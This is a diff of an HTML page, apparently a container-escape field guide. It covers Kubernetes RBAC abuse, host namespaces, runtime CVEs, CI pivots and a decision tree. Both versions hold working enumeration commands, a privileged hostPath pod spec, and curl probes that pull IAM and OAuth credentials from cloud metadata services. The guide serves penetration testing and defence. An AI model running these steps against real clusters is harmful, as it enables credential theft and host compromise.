-        command: [&quot;sh&quot;, &quot;-c&quot;, &quot;id; cat /host/etc/hostname; sleep 5&quot;]
-        securityContext:
-          privileged: true
-        volumeMounts:
-        - name: host
-          mountPath: /host
-      volumes:
-      - name: host
-        hostPath:
-          path: /
-</code></pre>
-<p>Failure gates:</p>
-<pre><code class="language-text">cannot create DaemonSets
-admission blocks privileged or hostPath
-namespace quota blocks workload
-image pull fails
-taints block scheduling
-</code></pre>
-<h2 id="113-secrets-path">11.3 Secrets path</h2>
-<p>Check:</p>
-<pre><code class="language-bash">kubectl auth can-i get secrets -n &quot;$NS&quot; --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i list secrets -n &quot;$NS&quot; --as=&quot;system:serviceaccount:$NS:$SA&quot;
-</code></pre>
-<p>Useful enumeration:</p>
-<pre><code class="language-bash">kubectl get secrets -n &quot;$NS&quot; -o name
-kubectl get secret &lt;name&gt; -n &quot;$NS&quot; -o json
-</code></pre>
-<p>Modern Kubernetes no longer creates long-lived service account token Secrets by default in the same way older clusters did, but application secrets still matter.</p>
-<h2 id="114-serviceaccountstoken">11.4 <code>serviceaccounts/token</code></h2>
-<p>Check:</p>
-<pre><code class="language-bash">kubectl auth can-i create serviceaccounts/token -n &quot;$NS&quot; --as=&quot;system:serviceaccount:$NS:$SA&quot;
-</code></pre>
-<p>If allowed, token minting can be more useful than reading old token Secrets:</p>
-<pre><code class="language-bash">kubectl create token &lt;serviceaccount&gt; -n &quot;$NS&quot;
-</code></pre>
-<p>The interesting question is which service accounts the identity can mint tokens for.</p>
-<h2 id="115-nodesproxy">11.5 <code>nodes/proxy</code></h2>
-<p>Check:</p>
-<pre><code class="language-bash">kubectl auth can-i get nodes/proxy --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i create nodes/proxy --as=&quot;system:serviceaccount:$NS:$SA&quot;
-</code></pre>
-<p>Node proxy can expose kubelet API paths through the API server.</p>
-<p>List nodes:</p>
-<pre><code class="language-bash">kubectl get nodes -o name
-</code></pre>
-<p>Probe:</p>
-<pre><code class="language-bash">NODE=&lt;node-name&gt;
-kubectl get --raw &quot;/api/v1/nodes/$NODE/proxy/healthz&quot;
-kubectl get --raw &quot;/api/v1/nodes/$NODE/proxy/pods&quot; | head
-</code></pre>
-<p>High-impact if kubelet exec-style paths are reachable with the granted verb combination. This varies by Kubernetes version, proxy behavior, and direct kubelet access.</p>
-<p>Failure gates:</p>
-<pre><code class="language-text">nodes/proxy absent
-API proxy blocks target path
-kubelet authz blocks request
-websocket path unsupported through proxy
-network policy irrelevant if going through API server
-</code></pre>
-<h2 id="116-bind-escalate-impersonate">11.6 <code>bind</code>, <code>escalate</code>, <code>impersonate</code></h2>
-<p>These verbs are privilege escalation indicators.</p>
-<p>Check:</p>
-<pre><code class="language-bash">kubectl auth can-i bind clusterroles --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i escalate clusterroles --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i impersonate users --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i impersonate groups --as=&quot;system:serviceaccount:$NS:$SA&quot;
-kubectl auth can-i impersonate serviceaccounts -n &quot;$NS&quot; --as=&quot;system:serviceaccount:$NS:$SA&quot;
-</code></pre>
-<p>Impact depends on scope:</p>
-<pre><code class="language-text">bind          can attach existing privileges to subjects
-escalate      can create or modify roles beyond current own permissions
-impersonate   can act as another identity if target is broad enough
-</code></pre>
-<hr>
-<h1 id="12-hostpid-hostnetwork-hostipc">12. hostPID, hostNetwork, hostIPC</h1>
-<p>These are not automatic escapes. They turn other primitives into escapes.</p>
-<p>Check current pod from inside:</p>
-<pre><code class="language-bash">ps auxww | head
-ip addr 2&gt;/dev/null | head
-ls -la /proc/1/root 2&gt;/dev/null
-readlink /proc/1/ns/pid /proc/self/ns/pid 2&gt;/dev/null
-</code></pre>
-<p>In Kubernetes specs:</p>
-<pre><code class="language-text">hostPID: true
-hostNetwork: true
-hostIPC: true
-</code></pre>
-<h2 id="121-hostpid">12.1 hostPID</h2>
-<p>With hostPID, process visibility expands.</p>
-<p>Useful checks:</p>
-<pre><code class="language-bash">ps -eo pid,ppid,user,comm,args | head -n 50
-ps -eo pid,comm,args | grep -E 'kubelet|containerd|dockerd|crio|systemd' | grep -v grep
-ls -l /proc/1/root
-</code></pre>
-<p>Read through process root:</p>
-<pre><code class="language-bash">cat /proc/1/root/etc/hostname 2&gt;/dev/null
-head -n 5 /proc/1/root/etc/os-release 2&gt;/dev/null
-</code></pre>
-<p>If combined with <code>CAP_SYS_PTRACE</code>, hostPID becomes more serious.</p>
-<h2 id="122-hostnetwork">12.2 hostNetwork</h2>
-<p>hostNetwork exposes the node network namespace.</p>
-<p>Checks:</p>
-<pre><code class="language-bash">ip addr
-ip route
-ss -lntup 2&gt;/dev/null | head
-</code></pre>
-<p>Interesting services:</p>
-<pre><code class="language-text">kubelet ports
-node-local metadata proxies
-local admin services
-container runtime listeners
-cluster overlay interfaces
-</code></pre>
-<h2 id="123-hostipc">12.3 hostIPC</h2>
-<p>hostIPC is less common as a direct escape. It matters when shared memory or IPC objects carry secrets or cross-process interaction opportunities.</p>
-<p>Check:</p>
-<pre><code class="language-bash">ipcs -a 2&gt;/dev/null
-ls -la /dev/shm
-</code></pre>
-<p>Failure gates:</p>
-<pre><code class="language-text">host namespace not shared
-missing ptrace capability
-hidepid or proc restrictions
-LSM blocks /proc access
-network services bound only to protected interfaces
-</code></pre>
-<hr>
-<h1 id="13-runtime-cves">13. Runtime CVEs</h1>
-<p>Runtime CVEs need reachable trigger paths. Inventory is not impact.</p>
-<h2 id="131-cve-2019-5736">13.1 CVE-2019-5736</h2>
-<p>Mechanism:</p>
-<pre><code class="language-text">runc is reachable during run or exec
-container influences /proc/[pid]/exe style handle
-host runc binary gets overwritten or affected
-next runtime invocation runs attacker-controlled code
-</code></pre>
-<p>Trigger classes:</p>
-<pre><code class="language-text">attacker-controlled image is started
-operator or automation runs exec into compromised container
-existing writable container filesystem is used as trap
-</code></pre>
-<p>Inventory:</p>
-<pre><code class="language-bash">runc --version 2&gt;/dev/null
+          <div class="comparison">
+            <div>
+              <span class="comparison-label">No remapping</span>
+              <pre><code class="language-text">0          0 4294967295</code></pre>
+              <p>Container UID 0 maps to host UID 0 across the full range.</p>
+            </div>
+            <div>
+              <span class="comparison-label">Remapped / rootless shape</span>
+              <pre><code class="language-text">0     100000      65536</code></pre>
+              <p>Container UID 0 maps to an unprivileged high-numbered host UID.</p>
+            </div>
+          </div>
+
+          <p>A capability is evaluated in a user namespace. <code>CAP_SYS_ADMIN</code> inside a child user namespace does not grant the same authority over host-global resources. This explains many “I am root and the bit is set, but the write still fails” situations.</p>
+
+          <h3>Capabilities need an interface</h3>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Capability</th>
+                  <th>Becomes important when paired with</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><code>CAP_SYS_ADMIN</code></td>
+                  <td>Writable cgroupfs, mount operations, namespace entry, or writable host-global sysctls.</td>
+                </tr>
+                <tr>
+                  <td><code>CAP_SYS_MODULE</code></td>
+                  <td>Host kernel module loading remains reachable and module policy permits it.</td>
+                </tr>
+                <tr>
+                  <td><code>CAP_SYS_PTRACE</code></td>
+                  <td>Host PID visibility and permissive procfs/LSM settings.</td>
+                </tr>
+                <tr>
+                  <td><code>CAP_DAC_READ_SEARCH</code></td>
+                  <td>A host filesystem view containing otherwise unreadable files.</td>
+                </tr>
+                <tr>
+                  <td><code>CAP_MKNOD</code></td>
+                  <td>A weak device cgroup and access to a meaningful host device.</td>
+                </tr>
+                <tr>
+                  <td><code>CAP_NET_ADMIN</code></td>
+                  <td>The host network namespace or a valuable shared network path.</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <h3>Translate errors into gates</h3>
+          <pre><code class="language-text">EPERM from mount                capability, seccomp, LSM, or user namespace
+permission denied on /proc/sys  read-only mount, capability, LSM, or user namespace
+device node opens with EPERM    device cgroup or LSM
+setns fails                     missing authority in the target namespace
+exec is denied                  AppArmor or SELinux policy
+socket connect is denied        Unix permissions, LSM, or an API authorization layer</code></pre>
+
+          <pre><code class="language-bash">awk '/^(NoNewPrivs|Seccomp):/' /proc/self/status
+cat /proc/self/attr/current 2&gt;/dev/null
+cat /proc/self/attr/apparmor/current 2&gt;/dev/null
+cat /sys/kernel/security/lsm 2&gt;/dev/null
+getenforce 2&gt;/dev/null
+id -Z 2&gt;/dev/null</code></pre>
+
+          <div class="callout">
+            <span class="callout-label">Interpretation</span>
+            <p><code>Seccomp: 2</code> means a filter is active, not that every interesting syscall is blocked. <code>docker-default</code>, <code>container_t</code>, and <code>spc_t</code> are policy clues, not verdicts. Test the exact operation and keep the error.</p>
+          </div>
+        </section>
+
+        <section id="platform">
+          <h2>Leave the container layer when the platform is stronger</h2>
+          <p class="section-intro">CI jobs, cloud identities, metadata services, registries, and deployment systems often hold more authority than the workload that can reach them. Nimbus was this kind of escape.</p>
+
+          <h3>The Nimbus chain</h3>
+          <div class="flow-chain nimbus-chain">
+            <div class="flow-step">
+              <div>
+                <span class="flow-kicker">Worker</span>
+                <h3>The local shell is confined</h3>
+                <p>No useful effective capabilities, no host mount, read-only kernel interfaces, and seccomp enabled.</p>
+              </div>
+            </div>
+            <div class="flow-step">
+              <div>
+                <span class="flow-kicker">Control plane</span>
+                <h3>The worker can create a build</h3>
+                <p>Its platform credentials do not grant host root. They grant the ability to request a different execution context.</p>
+              </div>
+            </div>
+            <div class="flow-step">
+              <div>
+                <span class="flow-kicker">Builder</span>
+                <h3>The new container is privileged</h3>
+                <p>The build configuration exposes host-global kernel state and a host-visible overlay path.</p>
+              </div>
+            </div>
+            <div class="flow-step">
+              <div>
+                <span class="flow-kicker">Host</span>
+                <h3><code>core_pattern</code> crosses the final boundary</h3>
+                <p>A controlled crash invokes the helper from the host view. The route is worker → platform → builder → kernel → host.</p>
+              </div>
+            </div>
+          </div>
+
+          <h3>Profile a build environment</h3>
+          <pre><code class="language-bash">env | grep -Ei 'CI|RUNNER|CODEBUILD|DOCKER|REGISTRY|KUBE|AWS|AZURE|GOOGLE|GCP'
+docker version 2&gt;/dev/null
+ls -l /var/run/docker.sock /certs/client 2&gt;/dev/null
+aws sts get-caller-identity 2&gt;/dev/null
+gcloud auth list 2&gt;/dev/null
+az account show 2&gt;/dev/null
+kubectl auth can-i '*' '*' 2&gt;/dev/null</code></pre>
+
+          <p>The high-value questions are about what the identity can create or modify:</p>
+          <ul class="editorial-list">
+            <li>Can it start a privileged build, VM, task, or pod?</li>
+            <li>Can it pass or assume a stronger role?</li>
+            <li>Can it push an image consumed by production?</li>
+            <li>Can it modify a deployment manifest, release artifact, or infrastructure state?</li>
+            <li>Can it read a kubeconfig, secret store, or deployment credential?</li>
+          </ul>
+
+          <h3>Metadata is a credential boundary, not a container escape</h3>
+          <p>Metadata access becomes interesting only when the returned identity can cross another boundary. Begin by establishing reachability and identity; do not dump credentials into terminal history or assessment logs.</p>
+
+          <details>
+            <summary>Metadata reachability probes</summary>
+            <pre><code class="language-bash"># AWS IMDSv2
+IMDS_TOKEN=$(curl -sS --max-time 2 -X PUT \
+  -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' \
+  http://169.254.169.254/latest/api/token)
+curl -sS --max-time 2 \
+  -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Google Cloud
+curl -sS --max-time 2 -H 'Metadata-Flavor: Google' \
+  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+
+# Azure
+curl -sS --max-time 2 -H 'Metadata: true' \
+  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/'</code></pre>
+          </details>
+
+          <h3>Use runtime CVEs last</h3>
+          <p>A version string is not an exploit path. Confirm the actual runtime, vendor backports, attacker control over the required object, and a reachable create/exec trigger.</p>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Example</th>
+                  <th>Mechanism</th>
+                  <th>What must be reachable</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>CVE-2019-5736</td>
+                  <td>A malicious container process abuses a <code>/proc/&lt;pid&gt;/exe</code> handle to overwrite the host <code>runc</code> binary.</td>
+                  <td>An affected runtime plus attacker control of a container and a subsequent <code>run</code> or <code>exec</code> invocation.</td>
+                </tr>
+                <tr>
+                  <td>CVE-2024-21626</td>
+                  <td>An internal file descriptor leaks a reference outside the container root and can expose or overwrite host paths.</td>
+                  <td>An affected runtime plus control of image <code>WORKDIR</code>, process cwd, bind source, or an <code>exec</code> target, depending on the attack.</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <pre><code class="language-bash">runc --version 2&gt;/dev/null
 docker version 2&gt;/dev/null
 containerd --version 2&gt;/dev/null
 crictl version 2&gt;/dev/null
 uname -a
-cat /etc/os-release
-</code></pre>
-<p>Questions:</p>
-<pre><code class="language-text">is vulnerable runc actually used
-is it vendor patched
-can attacker control image filesystem
-can attacker trigger run or exec
-are nodes shared with untrusted workloads
-does rootless or userns change impact
-</code></pre>
-<p>Do not stop at “old runc”. Check the trigger.</p>
-<h2 id="132-cve-2024-21626">13.2 CVE-2024-21626</h2>
-<p>Mechanism:</p>
-<pre><code class="language-text">runc leaked an internal file descriptor to a host directory during setup
-attacker-controlled cwd or bind source can point at /proc/self/fd/&lt;n&gt;
-container process keeps a host filesystem reference
-</code></pre>
-<p>The key detail is active targeting of the leaked descriptor. It is not “container randomly has host cwd”.</p>
-<p>Check exposure:</p>
-<pre><code class="language-bash">runc --version 2&gt;/dev/null
-docker version 2&gt;/dev/null
-containerd --version 2&gt;/dev/null
-</code></pre>
-<p>Exploitability questions:</p>
-<pre><code class="language-text">can attacker control image WORKDIR
-can attacker control process.cwd in OCI config
-can attacker control bind mount source
-can attacker trigger container create or exec
-is runc &lt;= affected line without vendor patch
-does rootless or userns reduce host impact
-</code></pre>
-<p>Affected paths in real environments:</p>
-<pre><code class="language-text">malicious Dockerfile or image config
-malicious OCI config
-runtime exec into attacker-controlled container
-CI image build pipeline
-shared Kubernetes node running untrusted images
-</code></pre>
-<hr>
-<h1 id="14-ci-and-build-containers">14. CI and build containers</h1>
-<p>CI often has the best privileges in the environment.</p>
-<p>Look for:</p>
-<pre><code class="language-text">Docker socket mounted
-privileged Docker-in-Docker
-DOCKER_HOST=tcp://docker:2375
-cloud credentials
-registry push rights
-deployment credentials
-shared runners
-self-hosted runner on production network
-</code></pre>
-<p>Inside job:</p>
-<pre><code class="language-bash">env | grep -Ei 'AWS|AZURE|GCP|GOOGLE|CI|TOKEN|REGISTRY|KUBE|DOCKER|RUNNER'
-aws sts get-caller-identity 2&gt;/dev/null
-gcloud auth list 2&gt;/dev/null
-az account show 2&gt;/dev/null
-kubectl auth can-i '*' '*' 2&gt;/dev/null
-docker version 2&gt;/dev/null
-</code></pre>
-<p>Docker-in-Docker clues:</p>
-<pre><code class="language-bash">env | grep -E 'DOCKER_HOST|DOCKER_TLS_CERTDIR'
-ps auxww | grep -E 'dockerd|containerd' | grep -v grep
-ls -l /var/run/docker.sock /certs/client 2&gt;/dev/null
-</code></pre>
-<p>GitLab Runner clues:</p>
-<pre><code class="language-bash">env | grep -Ei 'GITLAB|CI_JOB|CI_PROJECT|CI_RUNNER'
-mount | grep -Ei 'docker.sock|builds|runner'
-</code></pre>
-<p>GitHub self-hosted runner clues:</p>
-<pre><code class="language-bash">env | grep -Ei 'GITHUB|RUNNER'
-pwd
-ls -la
-</code></pre>
-<p>AWS CodeBuild clues:</p>
-<pre><code class="language-bash">env | grep -Ei 'CODEBUILD|AWS'
-aws sts get-caller-identity 2&gt;/dev/null
-aws codebuild list-projects 2&gt;/dev/null
-</code></pre>
-<p>Useful pivots:</p>
-<pre><code class="language-text">create privileged build
-start compute instance
-attach or pass role
-push production image
-modify deployment manifest
-modify IaC state
-use kubeconfig
-assume deploy role
-write artifact consumed by release
-</code></pre>
-<p>Nimbus fits here: worker credentials did not need to be host-root. They only needed to create the privileged build container that had the host primitive.</p>
-<p>Failure gates:</p>
-<pre><code class="language-text">pull request jobs have no secrets
-runner is ephemeral
-Docker is rootless
-socket absent
-cloud role scoped to read-only
-registry push denied
-deployment separated from build
-privileged mode disabled
-</code></pre>
-<hr>
-<h1 id="15-cloud-metadata-from-containers">15. Cloud metadata from containers</h1>
-<p>Metadata is not a container escape by itself, but it often becomes the next boundary.</p>
-<p>Check cloud hints:</p>
-<pre><code class="language-bash">env | grep -Ei 'AWS|AZURE|GOOGLE|GCP'
-ip route
-cat /etc/resolv.conf
-</code></pre>
-<p>AWS IMDS:</p>
-<pre><code class="language-bash">curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2&gt;/dev/null
-</code></pre>
-<p>IMDSv2 token attempt:</p>
-<pre><code class="language-bash">TOKEN=$(curl -s --max-time 2 -X PUT \
-  -H &quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot; \
-  http://169.254.169.254/latest/api/token)
+cat /etc/os-release</code></pre>
 
-curl -s --max-time 2 \
-  -H &quot;X-aws-ec2-metadata-token: $TOKEN&quot; \
-  http://169.254.169.254/latest/meta-data/iam/security-credentials/
-</code></pre>
-<p>GCP metadata:</p>
-<pre><code class="language-bash">curl -s --max-time 2 -H &quot;Metadata-Flavor: Google&quot; \
-  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
-</code></pre>
-<p>Azure metadata:</p>
-<pre><code class="language-bash">curl -s --max-time 2 -H &quot;Metadata: true&quot; \
-  &quot;http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/&quot;
-</code></pre>
-<p>Questions that matter:</p>
-<pre><code class="language-text">is metadata reachable from pod
-is the credential node-level or workload-level
-can it create stronger compute
-can it read secrets
-can it write registry or deployment artifacts
-can it pass roles
-</code></pre>
-<p>Failure gates:</p>
-<pre><code class="language-text">IMDS blocked by network policy or hop limit
-IMDSv2 required and SSRF path cannot set token header
-workload identity scoped correctly
-metadata proxy enforces pod identity
-cloud role read-only
-</code></pre>
-<hr>
-<h1 id="16-decision-tree">16. Decision tree</h1>
-<p>Use this as the second-monitor flow.</p>
-<pre><code class="language-text">1. Runtime socket?
-   docker.sock -&gt; Docker API path
-   containerd.sock -&gt; ctr or crictl path
-   crio.sock -&gt; crictl path
+          <p>Then verify the installed package changelog or vendor advisory. Distribution backports routinely invalidate naive version comparisons.</p>
+        </section>
 
-2. Host filesystem mounted?
-   RW / -&gt; direct node file primitive
-   RW /etc/kubernetes/manifests -&gt; static pod
-   RO /var/lib/kubelet -&gt; secrets and tokens
-   socket under host mount -&gt; runtime path
+        <section id="workflow">
+          <h2>Use this order under pressure</h2>
+          <p class="section-intro">The fastest workflow prioritizes delegated authority and direct host access, then falls back to local kernel and runtime research.</p>
 
-3. Kubernetes service account?
-   can create pods -&gt; dry-run bad pod
-   can create daemonsets -&gt; multi-node path
-   can get/list secrets -&gt; token and secret path
-   can create serviceaccounts/token -&gt; mint path
-   can nodes/proxy -&gt; kubelet API path
-   can bind/escalate/impersonate -&gt; RBAC escalation path
+          <div class="field-workflow">
+            <div>
+              <span>01</span>
+              <h3>Control planes</h3>
+              <p>Runtime sockets, Kubernetes tokens, CI credentials, cloud roles, and deployment APIs.</p>
+            </div>
+            <div>
+              <span>02</span>
+              <h3>Host views</h3>
+              <p>Read-write host mounts, kubelet state, static-pod paths, and host procfs.</p>
+            </div>
+            <div>
+              <span>03</span>
+              <h3>Local authority</h3>
+              <p>Effective capabilities, shared namespaces, devices, writable cgroups, and kernel sysctls.</p>
+            </div>
+            <div>
+              <span>04</span>
+              <h3>Guardrails</h3>
+              <p>User namespaces, seccomp, AppArmor, SELinux, read-only mounts, and API admission.</p>
+            </div>
+            <div>
+              <span>05</span>
+              <h3>Specific vulnerabilities</h3>
+              <p>Only after a reachable runtime and trigger have been identified.</p>
+            </div>
+          </div>
 
-4. Privileged or dangerous caps?
-   CAP_SYS_ADMIN -&gt; cgroups, mount, namespace, helper family
-   CAP_SYS_MODULE -&gt; kernel module path
-   CAP_SYS_PTRACE + hostPID -&gt; process path
-   CAP_DAC_READ_SEARCH + host mount -&gt; file read path
+          <h3>A one-screen decision table</h3>
+          <div class="table-wrap decision-table">
+            <table>
+              <thead>
+                <tr>
+                  <th>If you find</th>
+                  <th>Ask next</th>
+                  <th>Likely path</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Docker/containerd/CRI socket</td>
+                  <td>Can my UID connect, and can the daemon create host binds?</td>
+                  <td>Runtime → host</td>
+                </tr>
+                <tr>
+                  <td>Host filesystem</td>
+                  <td>Is it writable; does it include kubelet or runtime state?</td>
+                  <td>Filesystem → node</td>
+                </tr>
+                <tr>
+                  <td>Kubernetes service account</td>
+                  <td>Can it create workloads, and will admission accept the dangerous fields?</td>
+                  <td>API → pod → node</td>
+                </tr>
+                <tr>
+                  <td><code>CAP_SYS_ADMIN</code></td>
+                  <td>In which user namespace, against which writable interface?</td>
+                  <td>Capability + interface</td>
+                </tr>
+                <tr>
+                  <td>Writable <code>core_pattern</code></td>
+                  <td>Is there a host-visible helper and a valid core trigger?</td>
+                  <td>Kernel callback → host</td>
+                </tr>
+                <tr>
+                  <td>cgroup v1 <code>release_agent</code></td>
+                  <td>Do I have initial-user-namespace authority and a writable hierarchy?</td>
+                  <td>Legacy callback → host</td>
+                </tr>
+                <tr>
+                  <td>CI or cloud identity</td>
+                  <td>Can it create stronger compute or modify a consumed artifact?</td>
+                  <td>Platform → new context</td>
+                </tr>
+                <tr>
+                  <td>Old runtime version</td>
+                  <td>Is the actual package affected, and can I reach the required trigger?</td>
+                  <td>Runtime CVE, if proven</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
 
-5. Writable kernel helper?
-   core_pattern -&gt; crash handler
-   release_agent -&gt; cgroup empty trigger
-   modprobe -&gt; auto-load trigger
-   uevent_helper -&gt; uevent trigger
-   binfmt_misc -&gt; interpreter registration
+          <blockquote class="closing-line">
+            <p>The useful question is not “how do I break this container?” It is “which trusted component accepts input from it?”</p>
+          </blockquote>
 
-6. Namespace exposure?
-   hostPID -&gt; /proc/&lt;pid&gt;/root and process visibility
-   hostNetwork -&gt; node-local services
-   hostIPC -&gt; shared IPC objects
-   host mount namespace -&gt; direct mount view
+          <h3 id="references">Selected references</h3>
+          <ul class="source-list">
+            <li><a href="https://docs.docker.com/engine/security/">Docker Engine security</a>: daemon authority, capabilities, and user namespaces.</li>
+            <li><a href="https://docs.docker.com/engine/security/rootless/">Docker rootless mode</a>: how daemon authority changes under user namespaces.</li>
+            <li><a href="https://kubernetes.io/docs/concepts/security/rbac-good-practices/">Kubernetes RBAC good practices</a>: workload creation, <code>hostPath</code>, and <code>nodes/proxy</code> risks.</li>
+            <li><a href="https://kubernetes.io/docs/concepts/security/pod-security-standards/">Kubernetes Pod Security Standards</a>: restricted capabilities, privileged containers, and host namespaces.</li>
+            <li><a href="https://www.kernel.org/doc/html/latest/admin-guide/sysctl/kernel.html#core-pattern">Linux kernel <code>core_pattern</code> documentation</a>.</li>
+            <li><a href="https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v1/cgroups.html">Linux kernel cgroup v1 documentation</a>.</li>
+            <li><a href="https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv">OpenContainers advisory for CVE-2024-21626</a>.</li>
+          </ul>
 
-7. User namespace?
-   root maps to host root -&gt; normal impact
-   root maps to subuid -&gt; adjust expectations
-   rootless runtime -&gt; daemon control is user-level, not host-root
-
-8. Runtime CVE?
-   verify version
-   verify vendor patch
-   verify trigger path
-   verify attacker controls image, cwd, exec, or bind source
-
-9. CI or cloud credentials?
-   Docker socket in job -&gt; runtime path
-   privileged build -&gt; kernel helper path
-   cloud role -&gt; create stronger execution context
-   registry push -&gt; supply-chain path
-</code></pre>
-<p>High-priority hits:</p>
-<pre><code class="language-text">rootful Docker socket
-containerd or CRI socket with host mount or privileged creation
-read-write host root
-read-write /etc/kubernetes/manifests
-service account can create privileged hostPath pods
-service account can create DaemonSets with weak admission
-nodes/proxy with kubelet API reachability
-CAP_SYS_MODULE
-CAP_SYS_ADMIN plus writable cgroupfs
-privileged container plus writable core_pattern
-runc CVE with reachable run or exec trigger
-CI job with Docker socket and deployment credentials
-cloud role that can start privileged build or compute
-</code></pre>
-<p>Low-priority by itself:</p>
-<pre><code class="language-text">uid=0 with no caps, seccomp on, no host mount, no token
-read-only app config mount with no secrets
-service account with discovery-only permissions
-old runtime version with confirmed vendor backport
-CAP_NET_RAW alone in an otherwise confined container
-</code></pre>
-<hr>
-<h1 id="17-the-boundary-map">17. The boundary map</h1>
-<p>The container is only one boundary.</p>
-<p>The useful map is:</p>
-<pre><code class="language-text">process
-container namespace
-container runtime
-node filesystem
-kubelet
-Kubernetes API
-cloud metadata
-CI runner
-registry
-deployment system
-</code></pre>
-<p>Most failed attempts come from attacking the wrong layer.</p>
-<p>Nimbus looked like a worker escape until it became a build-system escape. Docker socket issues look like file mounts until you treat the socket as the runtime API. <code>hostPath</code> looks like storage until it includes kubelet state. Kubernetes RBAC looks like permissions until admission accepts a node-level pod.</p>
-<p>The practical question stays the same:</p>
-<pre><code class="language-text">what can this workload make something else do?
-</code></pre>
+          <a class="back-top" href="#top">Back to top ↑</a>
+        </section>
       </div>
     </article>
   </main>
 
-  <button class="manual-top" type="button" aria-label="Back to top"></button>
-
   <footer>
     © 2026 &nbsp;·&nbsp; Abdelaaziz Belkhair
   </footer>
-
 </body>
 
 </html>
